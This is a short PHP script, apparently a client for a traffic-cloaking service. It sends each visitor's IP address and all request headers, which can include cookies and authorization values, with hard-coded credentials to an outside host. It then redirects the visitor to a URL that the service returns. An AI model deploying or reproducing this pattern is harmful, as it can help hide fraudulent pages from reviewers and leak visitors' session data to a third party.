<?php

$apiURI = "https://abjump.cloak.cc/get/";

$uuid = 'db779d71-c980-4f25-91cc-1f4d0c7bdbbf';
$key = 'c25ddb55-67b8-4556-a2d2-17346130a16a';

if (!function_exists('getallheaders')) {
    function getallheaders() {
    $headers = [];
    foreach ($_SERVER as $name => $value) {
        if (substr($name, 0, 5) == 'HTTP_') {
            $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
        }
    }
    return $headers;
    }
}
function get_ip_address()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
}

$ip = get_ip_address();
$postData = array(
    'uuid' => $uuid,
    'key' => $key,
    'ip' => $ip ? $ip : "127.0.0.1",
    'headers' => getallheaders(),
);

$ch = curl_init($apiURI . $uuid);
curl_setopt_array($ch, array(
    CURLOPT_POST => TRUE,
    CURLOPT_RETURNTRANSFER => TRUE,
    CURLOPT_HTTPHEADER => array(
        'Content-Type: application/json'
    ),
    CURLOPT_POSTFIELDS => json_encode($postData)
));

$response = curl_exec($ch);
if ($response === FALSE) {
    die(curl_error($ch));
}
$responseData = json_decode($response, TRUE);
header('Location: ' . $responseData["url"], true, 302);